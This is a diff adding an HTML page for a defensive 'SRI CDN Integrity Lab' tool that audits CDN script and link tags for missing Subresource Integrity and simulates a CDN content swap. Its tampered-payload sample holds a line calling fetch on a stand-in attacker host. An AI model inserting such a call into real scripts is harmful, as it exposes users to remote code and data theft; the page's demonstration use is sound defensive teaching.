@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SRI CDN Integrity Lab | Algo Infinity Verse</title>
+  <meta name="description" content="Audit script/link CDN tags for missing Subresource Integrity, weak hash algorithms, and crossorigin mismatches. Simulate content-swap attacks and export patched HTML." />
+  <link rel="stylesheet" href="/styles.css" />
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Poppins:wght@300;400;500;600;700&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <script>
+    (function () {
+      try {
+        var storedTheme = localStorage.getItem('theme');
+        var prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+        var theme = storedTheme || (prefersLight ? 'light' : 'dark');
+        if (theme === 'light') {
+          document.documentElement.classList.add('light-mode');
+        } else {
+          document.documentElement.classList.remove('light-mode');
+        }
+      } catch (e) {}
+    })();
+  </script>
+</head>
+<body data-page="sri-cdn-integrity-lab">
+  <a href="#sri-main" class="sri-skip-link">Skip to main content</a>
+  <button type="button" id="scrollTopBtn" class="scroll-top-btn" aria-label="Scroll to top">
+    <i class="fas fa-arrow-up" aria-hidden="true"></i>
+  </button>
+
+  <div id="navbar-placeholder"></div>
+
+  <header class="sri-hero">
+    <div class="sri-hero-badge">
+      <i class="fas fa-link" aria-hidden="true"></i>
+      Supply Chain Security Lab
+    </div>
+    <h1>
+      SRI CDN
+      <span class="sri-hero-accent">Integrity Lab</span>
+    </h1>
+    <p>
+      Paste HTML with CDN <code>script</code>/<code>link</code> tags, detect missing integrity,
+      weak algorithms, and crossorigin issues — then generate patches and simulate a content swap.
+    </p>
+    <div class="sri-hero-stats" aria-live="polite">
+      <div class="sri-stat">
+        <span class="sri-stat-val" id="statTags">—</span>
+        <span class="sri-stat-label">CDN tags</span>
+      </div>
+      <div class="sri-stat">
+        <span class="sri-stat-val" id="statMissing">—</span>
+        <span class="sri-stat-label">Missing SRI</span>
+      </div>
+      <div class="sri-stat">
+        <span class="sri-stat-val" id="statWeak">—</span>
+        <span class="sri-stat-label">Weak alg</span>
+      </div>
+      <div class="sri-stat">
+        <span class="sri-stat-val" id="statRisk">—</span>
+        <span class="sri-stat-label">Risk score</span>
+      </div>
+    </div>
+  </header>
+
+  <main id="sri-main" class="sri-main">
+    <div class="container">
+      <div class="sri-workspace">
+        <section class="sri-panel" aria-labelledby="sri-input-title">
+          <div class="sri-panel-header">
+            <div class="sri-panel-title">
+              <i class="fas fa-file-code sri-panel-icon" aria-hidden="true"></i>
+              <h2 id="sri-input-title">HTML input</h2>
+            </div>
+          </div>
+
+          <label class="sri-label" for="sriInput">Paste HTML with script / link CDN tags</label>
+          <textarea
+            id="sriInput"
+            class="sri-textarea"
+            rows="12"
+            spellcheck="false"
+            aria-describedby="sriHint"
+            placeholder='<script src="https://cdn.example.com/lib.js"></script>'
+          ></textarea>
+          <p class="sri-hint" id="sriHint">Flags missing integrity, sha256-only hashes, and crossorigin mismatches on cross-origin URLs.</p>
+
+          <div class="sri-controls">
+            <button type="button" id="sriLoadDemoBtn" class="btn btn-secondary">
+              <i class="fas fa-flask" aria-hidden="true"></i> Load demo without SRI
+            </button>
+            <button type="button" id="sriAuditBtn" class="btn btn-primary">
+              <i class="fas fa-magnifying-glass" aria-hidden="true"></i> Audit SRI
+            </button>
+            <button type="button" id="sriPatchBtn" class="btn btn-outline" disabled>
+              <i class="fas fa-wrench" aria-hidden="true"></i> Generate patches
+            </button>
+            <button type="button" id="sriExportBtn" class="btn btn-outline" disabled>
+              <i class="fas fa-download" aria-hidden="true"></i> Export report
+            </button>
+          </div>
+          <div id="sriStatus" class="sri-status" role="status" aria-live="polite">Ready</div>
+        </section>
+
+        <section class="sri-panel" aria-labelledby="sri-findings-title">
+          <div class="sri-panel-header">
+            <div class="sri-panel-title">
+              <i class="fas fa-triangle-exclamation sri-panel-icon" aria-hidden="true"></i>
+              <h2 id="sri-findings-title">Findings</h2>
+            </div>
+          </div>
+          <div id="sriFindings" class="sri-findings" aria-live="polite">
+            <p class="sri-empty">Run an audit to list SRI issues.</p>
+          </div>
+        </section>
+      </div>
+
+      <div class="sri-workspace">
+        <section class="sri-panel" aria-labelledby="sri-swap-title">
+          <div class="sri-panel-header">
+            <div class="sri-panel-title">
+              <i class="fas fa-skull-crossbones sri-panel-icon" aria-hidden="true"></i>
+              <h2 id="sri-swap-title">CDN content-swap simulation</h2>
+            </div>
+          </div>
+          <p class="sri-hint">Demonstrates hash mismatch when CDN bytes change. Uses Web Crypto (SHA-384) when available.</p>
+          <label class="sri-label" for="sriSampleContent">Expected CDN payload (sample)</label>
+          <textarea id="sriSampleContent" class="sri-textarea sri-textarea-sm" rows="4" spellcheck="false">console.log("legit-lib v1.2.3");</textarea>
+          <label class="sri-label" for="sriTamperedContent">Tampered payload (attacker swap)</label>
+          <textarea id="sriTamperedContent" class="sri-textarea sri-textarea-sm" rows="4" spellcheck="false">console.log("legit-lib v1.2.3");/*evil*/fetch("https://attacker.example/pwn");</textarea>
+          <div class="sri-controls">
+            <button type="button" id="sriSimulateBtn" class="btn btn-primary">
+              <i class="fas fa-bolt" aria-hidden="true"></i> Simulate hash mismatch
+            </button>
+          </div>
+          <div id="sriSwapResult" class="sri-swap-result" role="status" aria-live="polite">
+            <p class="sri-empty">Run the simulation to compare integrity digests.</p>
+          </div>
+        </section>
+
+        <section class="sri-panel" aria-labelledby="sri-diff-title">
+          <div class="sri-panel-header">
+            <div class="sri-panel-title">
+              <i class="fas fa-code-compare sri-panel-icon" aria-hidden="true"></i>
+              <h2 id="sri-diff-title">Before / after HTML</h2>
+            </div>
+          </div>
+          <h3 class="sri-subhead">Patched markup</h3>
+          <pre class="sri-mono-block" id="sriPatched" aria-live="polite">—</pre>
+          <h3 class="sri-subhead">Diff view</h3>
+          <pre class="sri-mono-block sri-diff" id="sriDiff" aria-live="polite">—</pre>
+        </section>
+      </div>
+    </div>
+  </main>
+
+  <div id="footer-placeholder"></div>
+
+  <script src="/auth.js"></script>
+  <script src="/bootstrap-legacy.js"></script>
+  <script src="/script.js"></script>
+  <script type="module" src="/dist/legacy-bundle.mjs"></script>
+  <script src="/theme.js"></script>
+  <script src="script.js"></script>
+  <script>
+    if (typeof loadPartial === 'function') {
+      loadPartial('navbar-placeholder', '/partials/navbar.html');
+      loadPartial('footer-placeholder', '/partials/footer.html');
+    }
+  </script>
+</body>
+</html>
